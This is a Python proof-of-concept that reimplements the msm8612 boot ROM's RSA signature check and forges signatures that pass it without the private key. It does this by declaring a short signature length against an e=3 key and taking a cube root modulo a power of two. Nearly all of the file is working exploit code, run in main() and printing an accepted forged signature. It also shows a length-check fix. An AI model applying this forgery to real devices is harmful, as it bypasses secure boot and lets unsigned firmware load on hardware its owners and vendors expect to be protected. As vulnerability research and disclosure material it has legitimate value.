"""
msm8612 PBL short-signature PoC.

Reimplements, in Python, exactly what auth_verify_signature (0xfc01ed50) +
rsa_mod_exp_driver (0xfc01f46c) in msm8612.bootrom.bin do, then forges a
signature the same way and feeds it back through the reimplementation.

Internal bignum layout (bn_words_swap, 0xfc01f5dc): a big-endian byte string is
stored into a word array with the BYTE ORDER REVERSED, i.e. out[0] is the least
significant byte. So the 256-byte result buffer v68 is the integer in
little-endian byte order.
"""

import hashlib
import secrets

# ----------------------------------------------------------------- keygen ----

def _is_prime(n, rounds=16):
    if n < 2:
        return False
    for p in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37):
        if n % p == 0:
            return n == p
    d, r = n - 1, 0
    while d % 2 == 0:
        d //= 2
        r += 1
    for _ in range(rounds):
        a = secrets.randbelow(n - 3) + 2
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = x * x % n
            if x == n - 1:
                break
        else:
            return False
    return True


def _gen_prime(bits, want_mod3=None):
    while True:
        p = secrets.randbits(bits) | (1 << (bits - 1)) | 1
        if want_mod3 is not None and p % 3 != want_mod3:
            continue
        if _is_prime(p):
            return p


def rsa_keygen(bits=2048, e=3):
    """For e == 3 we need p == q == 2 (mod 3) so that gcd(3, lcm) == 1."""
    want = 2 if e == 3 else None
    p = _gen_prime(bits // 2, want)
    q = _gen_prime(bits // 2, want)
    while q == p:
        q = _gen_prime(bits // 2, want)
    return p * q, e


# ------------------------------------------- faithful PBL verifier reimplementation ----

FAIL = {
    1046: "modulus/exp ptr-len sanity (mod_len>0x100 or exp_len>4)",
    1070: "public exponent not in {3, 65537}",
    1131: "word at offset hashlen != 00 FF FF FF",
    1150: "FF padding scan hit a non-FF word",
    1158: "top word of the sig-width window != 00 01 FF FF",
    1173: "digest mismatch",
}


def pbl_verify_signature(modulus: bytes, exponent: bytes,
                         signature: bytes, digest: bytes,
                         require_len_equals_modulus=False):
    """
    Returns (ok, code). Mirrors auth_verify_signature():
      a2[60]=mod_len a2[61]=mod_ptr a2[62]=exp_len a2[63]=exp_ptr
      a3[24]=sig_ptr a3[28]=sig_len
    """
    mod_len, exp_len, sig_len = len(modulus), len(exponent), len(signature)
    hash_len = len(digest)

    # --- auth_verify_image() pre-checks on the region array -------------------
    if mod_len == 0 or mod_len > 0x100:
        return False, 1046
    if exp_len == 0 or exp_len > 4:
        return False, 1046
    if sig_len == 0 or sig_len > 0x100:
        return False, 1046
    if require_len_equals_modulus and sig_len != mod_len:
        return False, 9999

    # --- exponent whitelist: exactly 0x03, or 0x01 0x00 0x01 ------------------
    i = 0
    while i < exp_len and exponent[i] == 0:
        i += 1
    if not ((i + 1 == exp_len and exponent[i] == 3) or
            (i + 3 == exp_len and exponent[i] == 1
             and exponent[i + 1] == 0 and exponent[i + 2] == 1)):
        return False, 1070

    n = int.from_bytes(modulus, "big")
    e = int.from_bytes(exponent, "big")
    s = int.from_bytes(signature, "big")

    # rsa_mod_exp_driver(): zero-extend the base to the modulus word count,
    # then bn_mod_exp. Result word count == modulus word count (64).
    words = (mod_len + 3) // 4
    x = pow(s, e, n)
    v68 = x.to_bytes(words * 4, "little")
    w = [int.from_bytes(v68[4 * k:4 * k + 4], "little") for k in range(words)]

    # 1) *(u32*)(v68 + hash_len) != -256   ->  00 FF FF FF
    if int.from_bytes(v68[hash_len:hash_len + 4], "little") != 0xFFFFFF00:
        return False, 1131

    # 2) all-FF scan, bound comes from the SIGNATURE length, not the modulus
    v60 = (hash_len >> 2) + 1
    v13 = (sig_len >> 2) - 1          # <-- sig_len from the image header
    if v60 < v13:
        k = v60
        while w[k] == 0xFFFFFFFF:
            k += 1
            if k >= v13:
                break
        else:
            return False, 1150

    # 3) top word of the window must be 00 01 FF FF (LE u32 0x0001FFFF)
    if w[v13] != 0x0001FFFF:
        return False, 1158

    # 4) digest compare (v67 is bn_words_swap(digest))
    if v68[:hash_len] != digest[::-1]:
        return False, 1173

    return True, 0


# ------------------------------------------------------------------ forge ----

def forge_short_signature(n: int, digest: bytes, L: int, e: int = 3):
    """
    Build the L-byte PKCS#1 v1.5 block the PBL expects for a signature declared
    as L bytes, then take its e-th root modulo 2^(8L).
    """
    buf = bytearray(L)
    buf[0:len(digest)] = digest[::-1]      # low bytes = digest (reversed)
    buf[len(digest)] = 0x00                # 00 separator
    for i in range(len(digest) + 1, L - 2):
        buf[i] = 0xFF                      # FF padding
    buf[L - 2] = 0x01
    buf[L - 1] = 0x00

    T = int.from_bytes(bytes(buf), "little")
    if T % 2 == 0:
        return None, "digest is even -> no e-th root mod 2^k (retry another L/nonce)"

    k = 8 * L
    order = 1 << (k - 1)                   # |(Z/2^k)^*|
    d = pow(e, -1, order)
    s = pow(T, d, 1 << k)
    if pow(s, e, 1 << k) != T:
        return None, "root verification failed"
    # cheap guard first: avoid computing an astronomically large power
    if (s.bit_length() - 1) * e > n.bit_length():
        return None, "s^e >= n, modular reduction kicks in"
    if pow(s, e) >= n:
        return None, "s^e >= n, modular reduction kicks in"
    return s.to_bytes(L, "big"), None


# -------------------------------------------------------------------- main ----

def main():
    print("=" * 72)
    print("msm8612.bootrom  auth_verify_signature @0xfc01ed50 -- PoC")
    print("=" * 72)

    n, e = rsa_keygen(2048, e=3)
    print(f"\n[+] 2048-bit test modulus, e = {e}")
    print(f"    n = {hex(n)[:66]}...")

    modulus = n.to_bytes(256, "big")
    exponent = (3).to_bytes(1, "big")

    # the cube root mod 2^k only exists for an odd target, so the attacker
    # tweaks the image until the final digest byte is odd (~1 try in 2)
    nonce = 0
    while True:
        digest = hashlib.sha256(b"PBL image hash stand-in" + str(nonce).encode()).digest()
        if digest[-1] & 1:
            break
        nonce += 1
    print(f"[+] digest D3 = {digest.hex()}  (nonce={nonce}, odd -> root exists)")

    print("\n--- control: a genuine full-width signature shape --------------")
    # what a legit 256-byte signature would have to look like
    em = bytearray(256)
    em[0], em[1] = 0x00, 0x01
    for i in range(2, 256 - 32 - 1):
        em[i] = 0xFF
    em[256 - 33] = 0x00
    em[256 - 32:] = digest
    print(f"    EM = {bytes(em[:8]).hex()} ... {bytes(em[-36:]).hex()}")
    print(f"    (no private key, so we cannot produce s for L=256 -- as expected)")

    print("\n--- attack: declare L = 48 bytes against the 256-byte modulus ---")
    for L in (44, 48, 64, 72, 80):
        sig, err = forge_short_signature(n, digest, L, e)
        if sig is None:
            print(f"    L={L:3d}  forge failed: {err}")
            continue
        ok, code = pbl_verify_signature(modulus, exponent, sig, digest)
        verdict = "ACCEPTED" if ok else f"rejected ({code}: {FAIL.get(code, 'len!=mod')})"
        fixed = pbl_verify_signature(modulus, exponent, sig, digest,
                                     require_len_equals_modulus=True)
        print(f"    L={L:3d}  PBL verdict: {verdict:<12} | "
              f"with sig_len==mod_len check: {'ACCEPTED' if fixed[0] else 'rejected'}")

    print("\n--- e = 65537: the same trick is impossible --------------------")
    n2, _ = rsa_keygen(2048, e=65537)
    exp2 = (65537).to_bytes(3, "big")
    sig2, err = forge_short_signature(n2, digest, 48, 65537)
    print(f"    forge L=48 with e=65537: {err if err else 'produced a value'}")
    if sig2:
        ok, code = pbl_verify_signature(n2.to_bytes(256, "big"), exp2, sig2, digest)
        print(f"    PBL verdict: {'ACCEPTED' if ok else f'rejected ({code})'}")

    print("\n--- summary ----------------------------------------------------")
    sig, _ = forge_short_signature(n, digest, 48, e)
    ok, code = pbl_verify_signature(modulus, exponent, sig, digest)
    print(f"    forged {len(sig)}-byte signature for a 2048-bit key, no private key")
    print(f"    PBL auth_verify_signature() -> {'PASS' if ok else 'FAIL'} (rc={code})")
    print(f"    signature = {sig.hex()}")


if __name__ == "__main__":
    main()
